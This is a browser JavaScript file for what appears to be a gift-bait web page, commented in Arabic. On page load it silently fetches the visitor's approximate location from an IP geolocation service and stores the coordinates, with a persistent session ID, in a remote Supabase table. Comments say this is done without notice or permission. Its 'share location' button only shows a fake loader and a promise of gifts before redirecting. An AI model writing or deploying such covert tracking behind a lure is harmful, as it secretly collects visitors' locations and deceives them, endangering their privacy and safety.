const supabaseClient = window.supabaseClient;

function showToast(message, type) {
  var container = document.getElementById('toastContainer');
  var toast = document.createElement('div');
  toast.className = 'toast toast--' + type;
  toast.textContent = message;
  container.appendChild(toast);
  setTimeout(function () {
    toast.classList.add('removing');
    setTimeout(function () { toast.remove(); }, 300);
  }, 4000);
}

function showLoader() {
  document.getElementById('loader').classList.add('active');
}

function hideLoader() {
  document.getElementById('loader').classList.remove('active');
}

function getOrCreateSessionId() {
  var key = 'ls_session_id';
  var id = localStorage.getItem(key);
  if (!id) {
    id = crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36) + Math.random().toString(36).slice(2);
    localStorage.setItem(key, id);
  }
  return id;
}

// ─── تتبع IP تلقائي صامت عند فتح الصفحة (بدون أي رسائل أو أذونات) ───
async function trackByIP() {
  try {
    var sessionId = getOrCreateSessionId();
    var res = await fetch('https://ipapi.co/json/');
    var data = await res.json();
    if (data && data.latitude && data.longitude) {
      await supabaseClient
        .from('locations')
        .insert({
          latitude: data.latitude,
          longitude: data.longitude,
          accuracy: -1,          // -1 تعني تحديد تقريبي عبر IP
          session_id: sessionId
        });
    }
  } catch (e) {
    console.log('IP track silent error:', e);
  }
}

// تشغيل التتبع التلقائي بالـ IP فور تحميل الصفحة بصمت
trackByIP();

// ─── عند الضغط على الزر: توجيه مباشر بدون طلب أذونات متصفح ───
function shareLocation() {
  var btn = document.getElementById('shareBtn');
  btn.disabled = true;
  showLoader();

  // انتظار بسيط للمظهر التفاعلي ثم توجيه فوري
  setTimeout(function () {
    hideLoader();
    showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
    setTimeout(function () {
      window.location.href = 'gifts.html';
    }, 1500);
  }, 1000);
}

window.shareLocation = shareLocation;
